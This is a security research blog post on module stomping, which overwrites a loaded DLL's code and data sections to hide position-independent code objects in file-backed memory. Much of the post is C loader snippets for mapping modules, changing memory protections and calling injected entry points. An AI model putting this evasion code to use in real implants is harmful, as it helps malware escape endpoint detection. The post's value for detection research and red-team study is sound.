---
title: Module Stomping PIC
url: https://rastamouse.me/module-stomping-pic/
source: Rasta Mouse
date: 2026-05-26
fetch_date: 2026-05-27T06:12:41.413987
---

# Module Stomping PIC

[Rasta Mouse](https://rastamouse.me)

* [Home](https://rastamouse.me/)

26 May 2026

3 min read

[crystal-palace](/tag/crystal-palace/)

# Module Stomping PIC

Module stomping (aka module overloading or DLL hollowing) is a technique to hide malicious code within a process's memory. It essentially works by loading a legitimate DLL into memory and then overwriting its content. This helps the code appear to be a trusted, signed module backed by a file on disk, rather than injected into unbacked, private memory.

APIs like LoadLibrary and NtCreateSection/NtMapViewOfSection are some ways to achieve this. The following is a basic example of the latter.

```
HANDLE file = KERNEL32$CreateFileA ( dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL );

NTDLL$NtCreateSection ( &section, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, file );
KERNEL32$CloseHandle ( file );

PVOID module_base = NULL;
SIZE_T viewSize   = 0;
NTDLL$NtMapViewOfSection ( section, ( HANDLE ) -1, &module_base, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE );
NTDLL$NtClose ( section );
```

Once a module has been loaded, change its memory permissions to RW and erase the current headers and sections.

```
DWORD old_protect;
KERNEL32$VirtualProtect ( module_base, SizeOfDLL ( &module_data ), PAGE_READWRITE, &old_protect );
memset ( module_base, 0, SizeOfDLL ( &module_data ) );
```

Then, load your own DLL in its place, perform relocations and process imports, etc.

```
/* load dll into the module's address space */
LoadDLL ( &dll_data, dll_src, module_base );

/* handle imports */
IMPORTFUNCS funcs;
funcs.LoadLibraryA   = LoadLibraryA;
funcs.GetProcAddress = GetProcAddress;
ProcessImports ( &funcs, &dll_data, module_base );

/* fix module permissions */
fixModulePermissions ( &dll_data, module_base );
```

And finally, call its entry point.

```
/* call entry point */
DLLMAIN_FUNC entry = EntryPoint ( &dll_data, module_base );
entry ( ( HINSTANCE ) module_base, DLL_PROCESS_ATTACH, NULL );
```

![](https://storage.ghost.io/c/36/91/36918caa-651a-469a-9d4d-1ba06e2217bf/content/images/2026/05/Untitled-2026-05-24-1319-1.png)

With a lot of capabilities moving to position-independent code (PIC), I was curious to see if a module stomping strategy can still makes sense when you're not stomping a DLL over another DLL.

### PICOs

Position-Independent Code Objects (PICOs) are Crystal Palace's convention for running COFFs in memory. As the PE structure is based on COFF, COFFs have much of the same sections as a PE does - .text, .data, .rdata, etc. Crystal Palace essentially retains the data and code sections and throws everything else away. The 'vanilla' way to load a PICO is to allocate memory for the two sections and call its entry point or an exported function.

```
/* get pico appended to the loader */
char * pico_src = GETRESOURCE ( __DLLDATA__ );

/* alloc memory for data and code sections */
char * pico_data = KERNEL32$VirtualAlloc ( NULL, PicoDataSize ( pico_src ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
char * pico_code = KERNEL32$VirtualAlloc ( NULL, PicoCodeSize ( pico_src ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

/* load the pico into memory */
IMPORTFUNCS funcs;
funcs.LoadLibraryA   = LoadLibraryA;
funcs.GetProcAddress = GetProcAddress;
PicoLoad ( &funcs, pico_src, pico_code, pico_data );

/* code code section RX */
DWORD old_protect;
KERNEL32$VirtualProtect ( pico_code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );

/* call its entry point */
PICOMAIN_FUNC entry = PicoEntryPoint ( pico_src, pico_code );
entry ( NULL );
```

Calls to VirtualAlloc, HeapAlloc, etc, also create private, unbacked regions. A stomping approach means you could overwrite the .text and .data sections of a DLL instead. We can do this by walking the PE sections until we find the two sections of interest, briefly record their virtual addresses and sizes, and overwrite them in memory.

```
DWORD text_va = 0;
DWORD text_vs = 0;
DWORD data_va = 0;
DWORD data_vs = 0;

/* find .text and .data sections */
getSectionByName ( ".text", &module_data, &text_va, &text_vs );
getSectionByName ( ".data", &module_data, &data_va, &data_vs );

/* get pico appended to the loader */
char * pico_src = GETRESOURCE ( __DLLDATA__ );

/* make .text section RW */
DWORD old_protect;
KERNEL32$VirtualProtect ( module_base + text_va, text_vs, PAGE_READWRITE, &old_protect );

/* load the pico into memory */
IMPORTFUNCS funcs;
funcs.LoadLibraryA   = LoadLibraryA;
funcs.GetProcAddress = GetProcAddress;
PicoLoad ( &funcs, pico_src, module_base + text_va, module_base + data_va );

/* make .text section RX */
KERNEL32$VirtualProtect ( module_base + text_va, text_vs, PAGE_EXECUTE_READ, &old_protect );

/* call its entry point */
PICOMAIN_FUNC entry = PicoEntryPoint ( pico_src, module_base + text_va );
entry ( NULL );
```

### PIC

Crystal Palace structures PIC a little differently than a PICO. The blob begins with its executable code and any data is appended to the end. All of the associated code<->data plumping is done at link-time, rather than at runtime as with a PICO (`PicoLoad` in [LibTCG](https://tradecraftgarden.org/libtcg.html) handles that).

Crystal Palace PIC has a convention for restoring access to global variables via the `fixbss` command. The [TCG PIC example](https://tradecraftgarden.org/simplepic.html) look for slack RW space and uses that for the .bss data. Instead of slack space, my thought was to stomp PIC into the .text section of a DLL and use its RW .data section for .bss instead.

```
char * getBSS ( DWORD length )
{
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    KERNEL32$VirtualQuery( ( LPCVOID ) getBSS, &mbi, sizeof ( mbi ) );

    char * dll_base = ( char * ) mbi.AllocationBase;

    DWORD va = 0;
    DWORD vs = 0;

    DLLDATA dll_data;
    ParseDLL ( dll_base, &dll_data );

    getSectionByName ( ".data", &dll_data, &va, &vs );

    if ( vs < length )
    {
        /* too bad */
        return NULL;
    }

    return dll_base + va;
}
```

Since this implementation uses the DLL headers to find the various sections, it wouldn't work if those had been erased.

## Conclusion

My brief testing with Moneta for each of the scenarios above didn't reveal any IOCs in addition to those that are already expected for this technique (modified .text sections, headers, module not in PEB, etc), so this is obviously nothing new or ground-breaking. But it was a fun foray to see if an old and well-known technique could still be applicable in a brave new PIC world.

One of Crystal Palace's strengths is the tooling it provides to enable this kind of experimentation, outside the realms of an offensive capability. Good, old-fashioned security ground truth research has never been more accessible.

### Published by:

[![Rasta Mouse](https://www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=250&r=x&d=mp)](/author/rasta/ "Rasta Mouse")

### You might also like...

25

Apr

## Atomic BOFs

5 min read

09

Apr

## Crystal Mask

8 min read

04

Mar

## Islands of Invariance

6 min read

03

Jan

## BOF Cocktails

5 min read

01

Dec

## PIC Symphony

3 min read

Rasta Mouse © 2026

* [Sign up](#/portal/)

[Powered by Ghost](https://ghost.org/)